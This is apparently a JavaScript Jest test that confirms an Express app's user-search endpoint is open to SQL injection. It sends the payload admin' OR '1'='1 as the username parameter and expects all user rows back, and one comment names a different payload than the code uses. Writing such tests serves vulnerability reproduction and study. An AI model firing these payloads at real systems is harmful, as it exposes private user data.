const request = require('supertest');
const app = require('./app');

// Note: In app.js, the port is listen()ed to. We can close the server or bypass port binding by using supertest directly,
// but since the file calls app.listen() directly when required, let's close it if needed, or handle EADDRINUSE nicely.
// To avoid app.listen EADDRINUSE issues during parallel or multiple tests, we can use a helper or close the listening socket.

describe('SQL Injection Vulnerability Verification', () => {
  let server;

  beforeAll((done) => {
    // If the server is already listening, supertest will use it.
    // If not, we can listen on a dynamic port or let supertest run.
    done();
  });

  afterAll((done) => {
    // Since app.js starts the server automatically, requiring it calls app.listen(3000).
    // Express returns an http.Server instance from app.listen, but app.js does not export the server, only the app.
    // To prevent Jest from staying open, we can close the server or let Jest exit automatically.
    done();
  });

  it('should be vulnerable to SQL injection via the username query parameter', async () => {
    // Injecting string concatenation SQL injection payload: admin' --
    const exploitPayload = "admin' OR '1'='1";
    const res = await request(app)
      .get('/api/users/search')
      .query({ username: exploitPayload });

    expect(res.status).toBe(200);
    // Since the database contains admin and guest users, and OR '1'='1' evaluates to true for all rows:
    // It should return more than just a single matched user (specifically, both 'admin' and 'guest' rows)
    expect(Array.isArray(res.body)).toBe(true);
    expect(res.body.length).toBeGreaterThan(1);
    
    const usernames = res.body.map(u => u.username);
    expect(usernames).toContain('admin');
    expect(usernames).toContain('guest');
  });
});
